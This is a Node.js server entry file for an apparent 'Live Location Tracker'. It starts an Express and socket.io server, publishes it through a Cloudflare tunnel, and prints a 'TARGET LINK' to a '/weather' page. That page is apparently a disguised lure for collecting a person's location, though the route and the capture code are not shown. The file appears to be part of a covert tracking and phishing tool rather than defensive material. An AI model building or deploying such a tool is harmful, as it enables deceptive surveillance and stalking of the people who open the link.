const { tunnel: cloudflaredTunnel } = require("cloudflared")
const cookieParser = require("cookie-parser")
const socketIO = require("socket.io")
const config = require("./config")
const express = require("express")
const tarkine = require("tarkine")
const http = require('http')

const app = express()
const server = http.createServer(app)
const io = new socketIO.Server(server)
let currentPort = parseInt(process.env.PORT || config.port, 10)

global.remoteURL = `http://localhost:${currentPort}`
global.IO = io

app.set("view engine", "html")
app.engine("html", tarkine.renderFile)
app.use(cookieParser())
app.use(express.urlencoded({ extended: false }))
app.use(express.static(__dirname + "/public"))
app.use(express.json())

app.use("/", require("./router"))

function startServer(port) {
    server.listen(port, async () => {
        const localURL = `http://localhost:${port}`
        global.remoteURL = localURL
        console.log(`\n========================================`)
        console.log(`🚀 Live Location Tracker Server Started`)
        console.log(`LOCAL  : ${localURL}`)

        try {
            console.log(`Connecting Cloudflare Tunnel (15s timeout)...`)
            const tunnel = cloudflaredTunnel({
                "--url": localURL
            })

            // Safeguard with 15-second timeout so server never hangs if offline
            const timeoutPromise = new Promise((_, reject) =>
                setTimeout(() => reject(new Error("Cloudflare tunnel handshake timed out (15s)")), 15000)
            )

            global.remoteURL = await Promise.race([tunnel.url, timeoutPromise])
            console.log(`REMOTE : ${global.remoteURL}`)
            console.log(`TARGET LINK : ${global.remoteURL}/weather`)
        } catch (err) {
            console.warn(`[NOTICE] Cloudflare tunnel notice: ${err.message || err}`)
            console.warn(`Using local fallback URL: ${localURL}`)
            global.remoteURL = localURL
        }
        console.log(`========================================\n`)
    })
}

// Resilient error handler for EADDRINUSE
server.on("error", (err) => {
    if (err.code === "EADDRINUSE") {
        console.warn(`\n[WARN] Port ${currentPort} is already in use by another instance or process.`)
        currentPort++
        console.log(`[INFO] Automatically switching to next free port: ${currentPort}...\n`)
        setTimeout(() => startServer(currentPort), 300)
    } else {
        console.error("[ERROR] Server fatal error:", err.message)
    }
})

startServer(currentPort)
